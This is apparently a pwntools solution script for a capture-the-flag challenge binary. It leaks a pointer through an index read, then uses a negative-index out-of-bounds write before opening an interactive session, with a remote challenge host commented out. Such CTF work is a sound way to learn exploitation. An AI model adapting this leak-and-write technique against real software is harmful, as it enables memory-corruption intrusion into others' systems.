from pwn import *
elf  =  context.binary = ELF("./index-2_patched")
context.log_level = "debug"

io = process()
# io = remote("play.scriptsorcerers.xyz", 10468)
# gdb.attach(io)
io.sendline(b"1337")
io.sendline(b"2")

io.sendlineafter(b"Index: ",b"8")

io.recvuntil(b"Data: ")

file_leak = unpack(io.recvn(6),"all")

print(hex(file_leak))

io.sendline(b"1")
io.sendlineafter(b"Index: ",b"1")

payload= pack(file_leak)
io.sendlineafter(b"Data: ",payload)


io.sendline(b"1")

io.sendlineafter(b"Index: ",str(-6))
io.sendlineafter(b"Data: ",payload)










io.interactive()